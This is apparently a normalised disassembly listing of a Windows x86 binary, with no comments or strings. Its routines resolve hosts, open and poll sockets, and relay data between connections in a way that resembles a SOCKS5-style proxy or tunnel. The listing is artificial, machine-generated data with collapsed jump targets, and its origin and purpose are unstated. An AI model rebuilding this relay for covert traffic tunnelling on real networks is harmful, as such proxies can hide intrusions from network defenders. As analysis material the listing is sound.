mov edx [ esi + 0x64 ]
mov ecx 0x2
push edx
mov [ esi + 0x6c ] eax
mov [ ebp - 0x14 ] cx
call [ inet_addr@IAT ]
mov [ ebp - 0x10 ] eax
movzx eax [ esi + 0x70 ]
push eax
call [ htons@IAT ]
mov ecx [ esi + 0xa4 ]
mov ebx [ Sleep@IAT ]
mov [ ebp - 0x12 ] ax
mov edx [ ecx + 0x10 ]
push edx
call ebx
mov ecx [ esi + 0x6c ]
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push ecx
call [ connect@IAT ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov al 0x1
pop ebx
call sub_4049bd
mov esp ebp
pop ebp
retn
lea esp [ esp ]
mov ecx [ esi + 0xa4 ]
mov edx [ ecx + 0x10 ]
push edx
call ebx
mov ecx [ esi + 0x6c ]
push 0x10
lea eax [ ebp - 0x14 ]
push eax
push ecx
call [ connect@IAT ]
cmp eax 0xffffffff
je r-xdata
movzx eax [ esi + 0x68 ]
push eax
call [ htons@IAT ]
mov [ ebp - 0x12 ] ax
mov edi 0xfffe7960
mov edx [ esi + 0xa4 ]
inc edi
cmp edi [ edx + 0xc ]
jl r-xdata
sub_4031c0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x40
mov eax [ ebx + 0x6c ]
push esi
push edi
push eax
call [ closesocket@IAT ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
xor edi edi
sub ecx eax
sar ecx 0x1
mov [ esp + 0xc ] edi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x4 ]
movzx edx [ eax + edi * 2 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov [ esp + 0x10 ] ecx
jne r-xdata
mov eax ecx
cmp ecx [ ebx + 0x4 ]
je r-xdata
nop
lea edi [ esp + 0x28 ]
mov esi ebx
mov [ esp + 0x28 ] edx
mov [ esp + 0x2c ] 0x0
call sub_404870
mov edx [ esp + 0x10 ]
push edx
push ebx
lea esi [ esp + 0x1c ]
call sub_4043c0
mov eax [ esp + 0x14 ]
mov edi [ esp + 0xc ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov [ esp + 0x10 ] eax
mov eax [ eax ]
mov ecx [ esp + 0x10 ]
mov eax [ eax + 0x8 ]
jmp r-xdata
mov eax ecx
cmp ecx [ ebx + 0x4 ]
je r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
mov eax [ eax + 0x10 ]
push eax
call [ closesocket@IAT ]
mov ecx [ ebx + 0x10 ]
movzx edx [ ecx + edi * 2 ]
mov ecx [ ebx + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov [ esp + 0x10 ] ecx
jne r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
lea edi [ esp + 0x30 ]
mov esi ebx
mov [ esp + 0x30 ] edx
mov [ esp + 0x34 ] 0x0
call sub_404870
mov edx [ esp + 0x10 ]
push edx
push ebx
lea esi [ esp + 0x20 ]
call sub_4043c0
mov eax [ esp + 0x18 ]
mov edi [ esp + 0xc ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov [ esp + 0x10 ] eax
mov eax [ eax ]
mov ecx [ esp + 0x10 ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea esi [ ebx + 0x40 ]
mov eax ecx
cmp ecx [ esi + 0x4 ]
je r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
mov [ eax + 0x10 ] 0xffffffff
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x44 ]
movzx edx [ eax + edi * 2 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov [ esp + 0x10 ] ecx
jne r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
lea edi [ esp + 0x38 ]
mov [ esp + 0x38 ] edx
mov [ esp + 0x3c ] 0x0
call sub_404870
mov ecx [ esp + 0x10 ]
push ecx
lea ecx [ ebx + 0x40 ]
push ecx
lea esi [ esp + 0x24 ]
call sub_4043c0
mov eax [ esp + 0x1c ]
mov edi [ esp + 0xc ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov [ esp + 0x10 ] eax
mov eax [ eax ]
mov ecx [ esp + 0x10 ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea esi [ ebx + 0x50 ]
mov eax ecx
cmp ecx [ esi + 0x4 ]
je r-xdata
cmp [ eax + 0xc ] edx
jge r-xdata
mov esi [ eax + 0x10 ]
lea edx [ esp + 0x20 ]
push edx
push esi
call [ GetExitCodeThread@IAT ]
mov eax [ esp + 0x20 ]
push eax
push esi
call [ TerminateThread@IAT ]
push esi
call [ CloseHandle@IAT ]
mov ecx [ ebx + 0x10 ]
movzx edx [ ecx + edi * 2 ]
mov ecx [ ebx + 0x54 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
mov [ esp + 0x10 ] ecx
jne r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
lea edi [ esp + 0x40 ]
mov [ esp + 0x40 ] edx
mov [ esp + 0x44 ] 0x0
call sub_404870
mov edx [ esp + 0x10 ]
push edx
lea ecx [ ebx + 0x50 ]
push ecx
lea esi [ esp + 0x2c ]
call sub_4043c0
mov eax [ esp + 0x24 ]
mov edi [ esp + 0xc ]
cmp edx [ ecx + 0xc ]
jge r-xdata
mov [ esp + 0x10 ] eax
mov eax [ eax ]
mov ecx [ esp + 0x10 ]
mov eax [ eax + 0x8 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
mov eax [ eax ]
push eax
call sub_404f01
mov ecx [ esp + 0x14 ]
add esp 0x4
push ecx
call sub_4049cc
add esp 0x4
mov esi [ eax + 0x10 ]
mov eax [ esi ]
push eax
call [ closesocket@IAT ]
mov ecx [ esi + 0x4 ]
push ecx
call [ closesocket@IAT ]
mov edx [ esi + 0x10 ]
push edx
call sub_4049cc
mov eax [ esi + 0xc ]
add esp 0x4
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
push esi
call sub_4049cc
mov eax [ ebx + 0x10 ]
mov edx [ ebx + 0x14 ]
lea eax [ eax + edi * 2 ]
lea ecx [ eax + 0x2 ]
sub edx ecx
sar edx 0x1
add esp 0x4
add edx edx
push edx
push ecx
push eax
call sub_404ba0
add [ ebx + 0x14 ] 0xfffffffe
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
sub ecx eax
inc edi
sar ecx 0x1
add esp 0xc
mov [ esp + 0xc ] edi
cmp edi ecx
jb r-xdata
mov edx [ eax ]
push edx
call sub_404f01
mov eax [ esp + 0x14 ]
add esp 0x4
push eax
call sub_4049cc
add esp 0x4
sub_403480
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x14
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10 ] eax
push esi
push 0x6
push 0x1
push 0x2
mov esi ecx
call [ socket@IAT ]
mov [ esi ] eax
mov eax 0x2
push r--data
mov [ esp + 0x8 ] ax
call [ inet_addr@IAT ]
mov ecx [ esi + 0x10 ]
mov [ esp + 0x8 ] eax
mov dx [ ecx + 0x8 ]
mov ecx [ esi ]
push 0x10
lea eax [ esp + 0x8 ]
push eax
push ecx
mov [ esp + 0x12 ] dx
call [ connect@IAT ]
mov ecx esi
call sub_4035c0
mov [ esi + 0x4 ] eax
cmp eax 0xffffffff
je r-xdata
push 0x0
cmp eax 0xfffffffe
jne r-xdata
call sub_403880
cmp eax 0xffffffff
jne r-xdata
push 0x1
jmp r-xdata
mov ecx [ esp + 0x14 ]
pop esi
xor ecx esp
call sub_4049bd
mov esp ebp
pop ebp
retn
mov eax esi
call sub_403520
sub_403520
push ebp
mov ebp esp
sub esp 0xc
push esi
push edi
mov edi [ eax ]
push 0x7d0
push 0x1
lea edx [ ebp - 0x8 ]
mov ecx 0x10
push edx
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] cx
call [ WSAPoll@IAT ]
xor esi esi
cmp eax esi
jle r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
test [ ebp - 0x2 ] 0x10
je r-xdata
push ebx
mov ebx [ send@IAT ]
mov [ ebp - 0x4 ] esi
push esi
push 0x4
lea eax [ ebp - 0xc ]
push eax
push edi
call ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add ecx 0x2
mov [ ebp - 0x4 ] ecx
cmp ecx 0x7d0
jl r-xdata
add esi eax
jmp r-xdata
cmp eax 0x4
je r-xdata
push 0x2
call [ Sleep@IAT ]
test eax eax
js r-xdata
cmp esi 0x1
jne r-xdata
push 0x0
mov ecx 0x1
sub ecx esi
push ecx
lea edx [ ebp + esi + 0x8 ]
push edx
push edi
call ebx
test eax eax
jle r-xdata
pop ebx
je r-xdata
sub_4035c0
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ WSAPoll@IAT ]
push edi
mov ebx ecx
mov eax [ ebx ]
push 0x4e20
push 0x1
lea edx [ ebp - 0x24 ]
mov ecx 0x300
push edx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] cx
call esi
cmp eax 0x1
jge r-xdata
test eax eax
js r-xdata
mov edi edi
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
or eax 0xffffffff
pop ebx
call sub_4049bd
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x10 ]
movzx edx [ ecx + 0xa ]
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
push 0x0
push 0x2
push edx
mov edx [ ebp - 0x24 ]
push ecx
push edx
call sub_4010d0
mov edi eax
add esp 0x14
test edi edi
jg r-xdata
push 0x4e20
push 0x1
lea eax [ ebp - 0x24 ]
push eax
call esi
cmp eax 0x1
jl r-xdata
js r-xdata
cmp edi 0x1
jne r-xdata
je r-xdata
test eax eax
je r-xdata
mov esi [ socket@IAT ]
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
cmp [ ecx ] 0x0
je r-xdata
jns r-xdata
push 0x6
push 0x1
push 0x2
call esi
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
je r-xdata
lea edx [ ebp - 0x28 ]
push edx
push 0x8004667e
push eax
mov [ ebp - 0x28 ] 0x1
call [ ioctlsocket@IAT ]
mov ecx [ ebx + 0xc ]
mov ebx [ ecx ]
mov al [ ebx ]
cmp al 0x1
jne r-xdata
cmp edi 0xffffffff
je r-xdata
cmp al 0x3
jne r-xdata
cmp edi 0x7
jne r-xdata
cmp edi 0x32
jge r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ edx + 0xc ]
mov ecx [ eax ]
mov edx [ ecx + 0x1 ]
mov [ ebp - 0x10 ] edx
mov eax [ eax ]
mov cx [ eax + 0x5 ]
mov [ ebp - 0x12 ] cx
jmp r-xdata
mov al [ ebx + 0x1 ]
xor edi edi
test al al
je r-xdata
mov edi [ WSAGetLastError@IAT ]
mov eax 0x2
xor esi esi
mov [ ebp - 0x14 ] ax
xor ebx ebx
jmp r-xdata
lea edx [ edi + 0x1 ]
push 0x1
push edx
call sub_404f3b
push edi
add ebx 0x2
mov esi eax
push ebx
push esi
call sub_4086d0
add esp 0x14
push 0x10
mov [ esi + edi ] 0x0
call sub_404f7b
xor ecx ecx
mov [ eax ] ecx
add esp 0x4
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
push esi
mov [ eax + 0xc ] ecx
call [ gethostbyname@IAT ]
test eax eax
je r-xdata
movzx edi al
mov edx [ ebp - 0x1c ]
push 0x10
lea ecx [ ebp - 0x14 ]
push ecx
push edx
call [ connect@IAT ]
test eax eax
jns r-xdata
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0xc ]
mov ecx [ eax ]
mov dx [ ecx + edi + 0x2 ]
push esi
mov [ ebp - 0x12 ] dx
call sub_404f01
add esp 0x4
mov eax [ eax + 0xc ]
mov ecx [ eax ]
mov eax [ ecx ]
cmp esi 0x2748
jne r-xdata
call edi
push 0x64
mov esi eax
inc ebx
call [ Sleep@IAT ]
cmp esi 0x2733
je r-xdata
push 0x1
push 0x6
call sub_404f3b
mov edx [ ebp - 0x18 ]
mov edi eax
mov eax [ ebp - 0x10 ]
mov [ edi ] eax
mov cx [ ebp - 0x12 ]
add esp 0x8
mov [ edi ] cx
mov ebx [ edx ]
or eax 0xffffffff
mov [ ebp - 0x2c ] 0x6
nop
cmp ebx 0x1e
jl r-xdata
cmp ebx 0x1e
jge r-xdata
xor esi esi
mov [ ebp - 0x18 ] esi
push 0x0
push 0x4
lea eax [ ebp - 0x2c ]
push eax
push ebx
call [ send@IAT ]
jmp r-xdata
mov eax 0xfffffffe
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4049bd
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x18 ]
add ecx 0x2
mov [ ebp - 0x18 ] ecx
cmp ecx 0x7d0
jl r-xdata
add esi eax
jmp r-xdata
cmp eax 0x4
je r-xdata
push 0x2
call [ Sleep@IAT ]
test eax eax
js r-xdata
cmp esi 0x6
jne r-xdata
push 0x0
mov ecx 0x6
sub ecx esi
push ecx
lea edx [ esi + edi ]
push edx
push ebx
call [ send@IAT ]
test eax eax
jle r-xdata
push edi
call sub_404f01
add esp 0x4
cmp esi 0x6
jl r-xdata
xor esi esi
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4049bd
mov esp ebp
pop ebp
retn
or esi 0xffffffff
jmp r-xdata
sub_403880
push ebp
mov ebp esp
sub esp 0x20
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
push ebx
xor ebx ebx
push edi
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x18 ] ecx
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0x8 ]
mov edx [ eax ]
sub edx [ ecx + 0x4 ]
cmp edx [ eax + 0x4 ]
jle r-xdata
mov edx 0x10
mov [ ebp - 0x1c ] dx
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x4 ]
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax 0x300
mov [ ebp - 0x14 ] ax
mov edx [ esi + 0xc ]
mov eax [ esi + 0x10 ]
mov ecx [ edx + 0x4 ]
mov edx [ eax ]
sub edx ecx
cmp edx [ eax + 0x4 ]
jle r-xdata
or [ ebp - 0x14 ] 0x10
push 0x493e0
push 0x2
lea ecx [ ebp - 0x20 ]
push ecx
call [ WSAPoll@IAT ]
cmp eax ebx
jge r-xdata
cmp ecx ebx
jne r-xdata
cmp eax 0x1
jl r-xdata
call sub_405051
cmp [ eax ] 0xb
je r-xdata
mov eax 0x300
or [ ebp - 0x1c ] ax
or eax 0xffffffff
pop edi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x7
test [ ebp - 0x1a ] al
je r-xdata
call sub_405051
cmp [ eax ] 0x4
jne r-xdata
call sub_405051
cmp [ eax ] 0x4
jne r-xdata
test [ ebp - 0x12 ] al
je r-xdata
test [ ebp - 0x1a ] 0x300
je r-xdata
xor eax eax
mov [ ebp - 0x14 ] ax
mov eax [ esi + 0x8 ]
xor edx edx
mov [ ebp - 0x1c ] dx
mov ecx [ eax + 0x4 ]
cmp ecx [ eax + 0x8 ]
jle r-xdata
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
test [ ebp - 0x1a ] 0x10
je r-xdata
test [ ebp - 0x12 ] 0x300
jne r-xdata
pop edi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
test [ ebp - 0x12 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edi [ esi ]
push ebx
mov ebx [ eax + 0x4 ]
mov eax [ eax ]
add eax ecx
sub ebx ecx
push eax
call sub_401250
xor edx edx
add esp 0x8
cmp eax edx
jge r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
test [ ebp - 0x1a ] 0x300
je r-xdata
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push ebx
sub edx ecx
push edx
add eax ecx
mov ecx [ esi + 0x4 ]
push eax
push ecx
call [ send@IAT ]
cmp eax ebx
je r-xdata
mov ecx [ esi + 0x8 ]
add [ ecx + 0x8 ] eax
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ebx ebx
cmp ecx [ eax + 0x4 ]
jne r-xdata
call sub_405051
cmp [ eax ] 0xb
jne r-xdata
push 0x32
call [ Sleep@IAT ]
mov eax [ ebp - 0x4 ]
mov edx eax
inc eax
mov [ ebp - 0x4 ] eax
cmp edx 0x64
jle r-xdata
test [ ebp - 0x12 ] 0x300
je r-xdata
mov eax [ esi + 0xc ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
jge r-xdata
mov [ eax + 0x8 ] edx
mov ecx [ esi + 0x8 ]
mov [ ecx + 0x4 ] edx
xor ebx ebx
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
cmp [ ebp - 0x8 ] ebx
jle r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x4 ] ebx
je r-xdata
mov edx [ esi + 0x10 ]
mov ecx [ edx ]
mov edx [ eax ]
mov eax [ esi ]
push ebx
push 0x5
push ecx
push edx
push eax
call sub_4010d0
mov edi eax
add esp 0x14
cmp edi 0x1
jne r-xdata
mov ecx [ esi + 0xc ]
add [ ecx + 0x8 ] eax
mov eax [ esi + 0xc ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
cmp edx [ eax + 0x4 ]
jne r-xdata
call sub_405051
cmp [ eax ] 0xb
cmp [ ebp - 0xc ] ebx
jmp r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x10 ]
mov ecx [ edx ]
sub ecx [ eax + 0x4 ]
mov edx [ eax + 0x8 ]
add edx [ eax ]
mov eax [ esi + 0x4 ]
push ebx
push ecx
push edx
push eax
call [ recv@IAT ]
cmp eax ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ecx ]
cmp [ edx ] bl
je r-xdata
mov [ eax + 0x8 ] ebx
mov ecx [ esi + 0xc ]
mov [ ecx + 0x4 ] ebx
je r-xdata
jge r-xdata
jg r-xdata
mov [ ebp - 0xc ] 0x1
jmp r-xdata
mov eax [ esi + 0xc ]
add [ eax + 0x4 ] edi
mov ecx [ esi + 0x8 ]
add [ ecx + 0x4 ] eax
mov [ ebp - 0x4 ] ebx
call [ WSAGetLastError@IAT ]
call sub_405051
cmp [ eax ] 0xb
jne r-xdata
call sub_405051
cmp [ eax ] 0xb
je r-xdata
cmp [ ebp - 0xc ] ebx
jmp r-xdata
cmp edi ebx
jge r-xdata
or eax 0xffffffff
pop edi
pop ebx
mov esp ebp
pop ebp
retn
sub_403b40
mov eax [ edi + 0x4 ]
push ebx
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x15 ] 0x0
push esi
mov esi ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov eax [ edi + 0x4 ]
pop esi
mov [ eax + 0x8 ] eax
mov [ edi + 0x8 ] 0x0
pop ebx
retn
mov ecx [ esi + 0x8 ]
push ecx
mov ecx edi
call sub_403c40
mov esi [ esi ]
push ebx
call sub_4049cc
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov ebx esi
je r-xdata
sub_403bc0
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi eax
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
push edi
mov ebx ecx
jne r-xdata
cmp ebx [ esi + 0x4 ]
je r-xdata
mov ecx [ edx ]
jmp r-xdata
mov ecx [ edx ]
lea edi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
call sub_404870
push ebx
push esi
lea esi [ ebp - 0x4 ]
call sub_4043c0
mov eax [ ebp - 0x4 ]
add eax 0x10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edx ]
cmp eax [ ebx + 0xc ]
jge r-xdata
cmp [ eax + 0xc ] ecx
jge r-xdata
pop edi
pop esi
lea eax [ ebx + 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
mov ebx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_403c40
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x15 ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_403c40
mov esi [ esi ]
push edi
call sub_4049cc
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov edi esi
je r-xdata
sub_403c90
mov eax [ esi + 0x10 ]
push ebx
xor ebx ebx
cmp eax ebx
je r-xdata
push edi
mov edi [ esi + 0x8 ]
cmp edi ebx
jbe r-xdata
lea ebx [ ebx ]
mov eax [ esi + 0x4 ]
pop edi
cmp eax ebx
je r-xdata
lea ebx [ ebx ]
cmp [ esi + 0x10 ] ebx
jne r-xdata
dec eax
mov [ esi + 0x10 ] eax
jne r-xdata
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
pop ebx
retn
push eax
call sub_4049cc
add esp 0x4
cmp edi ebx
ja r-xdata
mov ecx [ eax ]
push ecx
call sub_4049cc
add esp 0x4
cmp eax ebx
je r-xdata
mov [ esi + 0xc ] ebx
mov eax [ esi + 0x4 ]
dec edi
cmp [ eax + edi * 4 ] ebx
lea eax [ eax + edi * 4 ]
je r-xdata
sub_403d00
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x7fffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x1
cmp eax ecx
jae r-xdata
push r--data
call sub_4048f7
pop ebp
retn 0x4
push ebx
push edi
call sub_403fc0
mov ecx [ esi + 0x4 ]
mov ebx eax
mov eax [ esi ]
sub ecx eax
sar ecx 0x1
add ecx ecx
push ecx
push eax
push ebx
call sub_404ba0
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
add esp 0xc
sar edi 0x1
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
lea ecx [ ebx + edi * 2 ]
lea eax [ ebx + edx * 2 ]
pop edi
mov [ esi ] ebx
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] ecx
pop ebx
push eax
call sub_4049cc
add esp 0x4
sub_403d70
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push edi
mov edi eax
mov eax [ edi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx edx
je r-xdata
cmp edx eax
jne r-xdata
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
cmp [ ecx + 0x15 ] 0x0
mov edx ecx
jne r-xdata
call sub_403b40
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
push edx
lea edx [ ebp - 0x4 ]
push edx
push edi
call sub_404010
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ ebp + 0x8 ] eax
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ ebp + 0x8 ] ecx
jmp r-xdata
lea esp [ esp ]
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_403e30
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebx + 0x8 ]
mov eax 0xfffffff
sub eax ecx
mov [ ebp - 0x8 ] 0x1
cmp eax 0x1
jae r-xdata
mov eax ecx
shr eax 0x1
cmp eax 0x8
jae r-xdata
push r--data
call sub_4048f7
cmp eax 0x1
jbe r-xdata
mov eax 0x8
jmp r-xdata
mov eax [ ebp - 0x8 ]
push esi
push edi
mov edi [ ebx + 0xc ]
xor esi esi
shr edi 0x2
add eax ecx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] esi
cmp eax esi
jbe r-xdata
mov edx 0xfffffff
sub edx eax
cmp ecx edx
ja r-xdata
mov eax [ ebx + 0x8 ]
mov ecx [ ebx + 0x4 ]
add eax eax
add eax eax
lea esi [ edi * 4 ]
lea edx [ esi + ecx ]
sub eax edx
add eax ecx
sar eax 0x2
add eax eax
add eax eax
push eax
push edx
mov edx [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea eax [ esi + edx ]
push eax
call sub_404ba0
mov edx [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
mov ecx [ ebx + 0x4 ]
add esp 0xc
cmp edi edx
ja r-xdata
cmp eax 0x3fffffff
ja r-xdata
mov [ ebp - 0x8 ] eax
lea edi [ edx * 4 ]
mov edx edi
sar edx 0x2
add edx edx
add edx edx
push edx
push ecx
push eax
call sub_404ba0
mov eax [ ebx + 0x4 ]
lea ecx [ edi + eax ]
sub esi ecx
add esi eax
mov eax [ ebp - 0x4 ]
sar esi 0x2
add esi esi
add esi esi
push esi
push ecx
push eax
call sub_404ba0
mov ecx [ ebp - 0x8 ]
add esp 0x18
lea edi [ esi + eax ]
test ecx ecx
je r-xdata
sar esi 0x2
mov [ ebp - 0xc ] esi
mov esi edx
mov edx [ ebp - 0xc ]
add edx edx
add edx edx
push edx
push ecx
push eax
mov [ ebp - 0xc ] edx
call sub_404ba0
mov edx eax
add edx [ ebp - 0xc ]
add esp 0xc
sub esi edi
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x10 ] esi
call sub_404adf
push r--data
lea ecx [ ebp - 0x1c ]
push ecx
mov [ ebp - 0x1c ] r--data
call sub_405255
int3
lea ecx [ eax * 4 ]
push ecx
call sub_4049d7
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
mov eax [ ebx + 0x4 ]
pop edi
pop esi
test eax eax
je r-xdata
xor eax eax
[ edi ]
test edi edi
je r-xdata
mov ecx esi
xor eax eax
mov edi edx
[ edi ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add [ ebx + 0x8 ] edx
mov [ ebx + 0x4 ] ecx
mov esp ebp
pop ebp
retn
push eax
call sub_4049cc
add esp 0x4
mov ecx edi
mov edi [ ebp - 0x4 ]
jmp r-xdata
sub_403fc0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x7fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_404adf
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_405255
lea eax [ ecx + ecx ]
push eax
call sub_4049d7
add esp 0x4
test eax eax
jne r-xdata
sub_404010
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub esp 0x8
cmp [ eax + 0x15 ] 0x0
je r-xdata
push ebx
push esi
mov ebx eax
push edi
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ebx
call sub_404350
mov ecx [ ebx ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
push r--data
call sub_404944
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x15 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x15 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebx ]
mov [ eax ] ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x15 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
